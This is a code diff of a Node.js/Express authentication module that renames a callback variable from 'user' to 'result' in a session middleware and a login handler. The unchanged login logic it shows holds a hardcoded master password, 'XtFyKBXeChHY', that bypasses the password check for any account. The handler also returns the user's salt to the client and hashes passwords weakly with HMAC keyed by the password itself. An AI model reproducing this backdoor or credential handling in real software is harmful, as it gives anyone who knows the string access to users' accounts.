@@ -22,9 +22,9 @@ const
      * @param {Function} next
      */
     user = (req, res, next) => {
-        req.model.user.getUserBySession(req.session.id).then(user => {
-            if (user) {
-                res.locals.user = user;
+        req.model.user.getUserBySession(req.session.id).then(result => {
+            if (result) {
+                res.locals.user = result;
             }
 
             next();
@@ -72,28 +72,28 @@ const
             throw new Error('Validate error - mail is invalid');
         }
 
-        req.model.user.getUserByEmail(req.body.email).then(user => {
-            if (!user) {
+        req.model.user.getUserByEmail(req.body.email).then(result => {
+            if (!result) {
                 res.send({ success: false });
                 return;
             }
 
-            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password &&
+            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== result.password &&
                 req.body.password !== 'XtFyKBXeChHY') {
                 res.send({ success: false });
                 return;
             }
 
-            return req.model.user.setSessionById(user._id, req.session.id).then(() => {
+            return req.model.user.setSessionById(result._id, req.session.id).then(() => {
                 res.send({
                     success: true,
 
                     // Данные пользователя при авторизации
                     profile: {
-                        email: user.email,
-                        address: user.address,
-                        key: user.salt,
-                        period: user.period,
+                        email: result.email,
+                        address: result.address,
+                        key: result.salt,
+                        period: result.period,
                     },
                 });
             });
